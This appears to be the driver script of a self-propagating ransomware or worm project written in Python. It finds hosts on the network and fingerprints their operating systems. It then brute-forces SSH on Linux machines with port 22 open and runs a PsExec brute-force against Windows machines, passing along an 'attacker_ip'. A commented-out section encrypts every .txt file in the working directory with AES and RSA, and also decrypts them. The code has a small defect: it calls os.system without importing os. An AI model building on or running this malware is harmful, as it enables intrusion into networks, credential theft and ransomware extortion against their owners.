from os import listdir
from os.path import isfile, join
from os import getcwd
from aes_decryption import aes_decrypt
from aes_encryption import aes_encrypt
import RSA_encryption as Rencrypt
import RSA_decryption as Rdecrypt
import get_ip 
import get_os
import SSHBruteForce as ssh
import port_scan as port
import Psexec_BruteForce as ps
import sys
print(sys.argv[1])
server_pid= sys.argv[1]
ip_list,attacker_ip = get_ip.get_ip_()
print(ip_list)
print(attacker_ip)
for ip in ip_list:
   os_name = get_os.get_os_(ip)
   port_22 = port.check_open_port(ip)
   if(os_name == 'Linux' and port_22 == True ):
          ssh.d_main(ip)
   elif(os_name == 'Microsoft'):
          ps.d_main(ip,attacker_ip)
os.system('bash close.sh {0}'.format(server_pid))
          


#driver = int(input("Enter 1 for encryption and 2 for decryption:"))
#if(driver == 1):
#   onlyfiles = [f for f in listdir(getcwd()) if(isfile(join(getcwd(), f))  and f.split('.')[1]=="txt" )]
#   for file in onlyfiles:
#      aes_encrypt(file)
#   Rencrypt.d_main()
#elif(driver == 2):
#   Rdecrypt.d_main()
#   onlyfiles = [f for f in listdir(getcwd()) if(isfile(join(getcwd(), f))  and f.split('.')[1]=="txt" )]
#  for file in onlyfiles:
#       aes_decrypt(file)
   
